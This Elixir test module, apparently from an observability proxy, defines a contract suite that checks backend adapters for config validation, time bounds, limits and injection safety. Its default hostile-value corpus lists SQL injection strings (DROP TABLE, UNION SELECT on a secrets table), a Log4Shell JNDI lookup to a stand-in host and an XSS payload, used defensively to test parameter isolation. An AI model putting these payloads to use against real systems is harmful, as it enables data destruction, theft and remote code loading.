defmodule O11yProxy.BackendCase do
  @moduledoc """
  Shared contract test suite every adapter must pass — see "Adapter contract test suite"
  in `.plans/02-backend-behaviour.md`. Written in Phase 1, before the first real adapter,
  and self-tested there against `O11yProxy.Test.FakeBackend`
  (`test/o11y_proxy/backends/fake_backend_test.exs`).

  `use` it with:

    * `:backend` — the adapter module under test
    * `:valid_config` — a keyword list (atom keys, already the shape `config_schema/0`
      expects) that should validate
    * `:invalid_config` — a mangled version that should not
    * `:queries` — a non-empty list of `%O11yProxy.Query{}`, covering every mode the
      adapter declares
    * `:time_bound?` — `(native -> boolean)`
    * `:limit_present?` — `(native, query -> boolean)`
    * `:value_isolated?` — `(native, hostile_value -> boolean)` — true if a filter value
      is only ever reachable as a bound parameter, never spliced into the native query's
      literal text
    * `:hostile_values` — optional corpus override; defaults to `default_hostile_values/0`
    * `:moduletag` — optional, e.g. `:clickhouse` — set when the adapter needs a live
      backend so the suite can be excluded by default (see `test/test_helper.exs`) and
      opted into with `mix test --include <tag>`
    * `:probe_field` — optional, defaults to `"body"` — the canonical field used to build
      the single-filter queries in the unsupported-operator and injection-safety tests.
      Override it for an adapter whose signal has no `body` (e.g. metrics — use
      `"labels.foo"`), so those tests actually exercise operator/value handling instead
      of failing on an unmapped field for an unrelated reason

  The three predicates are genuine functions, not data, so they're spliced into each
  test's body as source (`unquote/1`) rather than carried through a module attribute —
  a compiled closure can't be re-escaped into another module's AST, only the code that
  builds it can.
  """

  defmacro __using__(opts) do
    backend = Keyword.fetch!(opts, :backend)
    valid_config = Keyword.fetch!(opts, :valid_config)
    invalid_config = Keyword.fetch!(opts, :invalid_config)
    queries = Keyword.fetch!(opts, :queries)
    time_bound = Keyword.fetch!(opts, :time_bound?)
    limit_present = Keyword.fetch!(opts, :limit_present?)
    value_isolated = Keyword.fetch!(opts, :value_isolated?)

    hostile_values =
      Keyword.get(
        opts,
        :hostile_values,
        quote(do: O11yProxy.BackendCase.default_hostile_values())
      )

    moduletag = Keyword.get(opts, :moduletag)
    probe_field = Keyword.get(opts, :probe_field, "body")

    quote do
      use ExUnit.Case, async: true

      if unquote(moduletag) do
        @moduletag unquote(moduletag)
      end

      @backend unquote(backend)
      @valid_config unquote(valid_config)
      @invalid_config unquote(invalid_config)
      @queries unquote(queries)

      if @queries == [] do
        raise "#{inspect(__MODULE__)}: :queries fixture must not be empty"
      end

      test "config_schema/0 accepts the valid fixture config" do
        assert {:ok, _} = NimbleOptions.validate(@valid_config, @backend.config_schema())
      end

      test "config_schema/0 rejects the mangled fixture config" do
        assert {:error, %NimbleOptions.ValidationError{}} =
                 NimbleOptions.validate(@invalid_config, @backend.config_schema())
      end

      test "capabilities/1 declares only signals/operators/modes O11yProxy.Query itself knows about" do
        {:ok, state} = @backend.init(Map.new(@valid_config))
        caps = @backend.capabilities(state)

        assert Enum.all?(caps.signals, &(&1 in O11yProxy.Query.signals()))
        assert Enum.all?(caps.modes, &(&1 in O11yProxy.Query.modes()))
        assert Enum.all?(caps.operators, &(&1 in O11yProxy.Query.Filter.operators()))
        assert is_boolean(caps.raw)
      end

      test "compile/2 emits a time bound for every query, always" do
        {:ok, state} = @backend.init(Map.new(@valid_config))
        time_bound? = unquote(time_bound)

        for query <- @queries do
          assert {:ok, native} = @backend.compile(state, query)

          assert time_bound?.(native),
                 "expected a time bound in #{inspect(native)} for #{inspect(query)}"
        end
      end

      test "compile/2 emits a limit for every non-summary query" do
        {:ok, state} = @backend.init(Map.new(@valid_config))
        limit_present? = unquote(limit_present)

        for query <- @queries, query.mode != :summary do
          assert {:ok, native} = @backend.compile(state, query)

          assert limit_present?.(native, query),
                 "expected a limit in #{inspect(native)} for #{inspect(query)}"
        end
      end

      test "compile/2 rejects an unsupported operator instead of silently dropping it" do
        {:ok, state} = @backend.init(Map.new(@valid_config))
        caps = @backend.capabilities(state)
        unsupported = O11yProxy.Query.Filter.operators() -- caps.operators

        assert unsupported != [],
               "this adapter declares support for every operator — add a fixture gap or " <>
                 "confirm that's really true before relying on this test"

        base = hd(@queries)

        for op <- unsupported do
          query = %{
            base
            | filters: [%O11yProxy.Query.Filter{field: unquote(probe_field), op: op, value: "x"}]
          }

          assert {:error, _} = @backend.compile(state, query)
        end
      end

      test "compile/2 is injection-safe against a corpus of hostile filter values" do
        {:ok, state} = @backend.init(Map.new(@valid_config))
        base = hd(@queries)
        value_isolated? = unquote(value_isolated)

        probe_op =
          if :contains in @backend.capabilities(state).operators, do: :contains, else: :eq

        for value <- unquote(hostile_values) do
          query = %{
            base
            | filters: [
                %O11yProxy.Query.Filter{field: unquote(probe_field), op: probe_op, value: value}
              ]
          }

          case @backend.compile(state, query) do
            {:ok, native} ->
              assert value_isolated?.(native, value),
                     "hostile value #{inspect(value)} leaked into the native query text: #{inspect(native)}"

            {:error, _} ->
              :ok
          end
        end
      end

      test "execute/2 output validates against the canonical record schema" do
        # :summary output is intentionally not canonical-record-shaped (time-bucketed
        # aggregates, no body/trace_id/etc — see `.plans/01-agent-contract.md`), so this
        # only checks a :sample/:full query if the fixture has one. Metrics never return
        # canonical records at all (always {name, labels, points} MetricSeries) — skip
        # the shape check for that signal but still validate the envelope generically.
        {:ok, state} = @backend.init(Map.new(@valid_config))
        query = Enum.find(@queries, &(&1.mode != :summary)) || hd(@queries)
        {:ok, native} = @backend.compile(state, query)

        assert {:ok, %{records: records, native: native_text, total: total}} =
                 @backend.execute(state, native)

        assert is_binary(native_text)
        assert is_nil(total) or is_integer(total)

        if query.mode != :summary and query.signal != :metrics do
          Enum.each(records, &O11yProxy.BackendCase.assert_canonical_record!/1)
        end
      end
    end
  end

  import ExUnit.Assertions

  # Deliberately no plain whitespace entry: any multi-word native query text legitimately
  # contains spaces, so a lone " " would "leak" trivially under a naive substring check
  # and tell us nothing about injection safety. "{evil:String}" instead targets adapters
  # that use a `{name:Type}` placeholder syntax (ClickHouse's, and this suite's own
  # FakeBackend fixture) — a value that looks like a second placeholder.
  @default_hostile_values [
    "'; DROP TABLE users; --",
    ~s("' OR "1"="1),
    "${jndi:ldap://evil/a}",
    "<script>alert(1)</script>",
    String.duplicate("a", 10_000),
    "{evil:String}",
    "*/ UNION SELECT * FROM secrets--",
    ".*"
  ]

  @spec default_hostile_values() :: [String.t()]
  def default_hostile_values, do: @default_hostile_values

  @doc "Asserts a record from `execute/2` matches `O11yProxy.Record`'s canonical shape."
  @spec assert_canonical_record!(O11yProxy.Record.t()) :: :ok
  def assert_canonical_record!(%O11yProxy.Record{} = record) do
    assert(is_binary(record.timestamp), "timestamp must be a string")

    case DateTime.from_iso8601(record.timestamp) do
      {:ok, dt, _offset} ->
        assert(
          dt.time_zone == "Etc/UTC" or (dt.utc_offset == 0 and dt.std_offset == 0),
          "timestamp #{record.timestamp} must be UTC"
        )

      {:error, reason} ->
        flunk("timestamp #{inspect(record.timestamp)} is not RFC3339: #{inspect(reason)}")
    end

    assert(
      record.severity in O11yProxy.Record.severities(),
      "severity #{inspect(record.severity)} is not in the canonical enum"
    )

    assert(is_binary(record.body))
    assert(is_binary(record.service))
    assert(is_map(record.attributes))
    assert(is_binary(record.source))
    :ok
  end
end
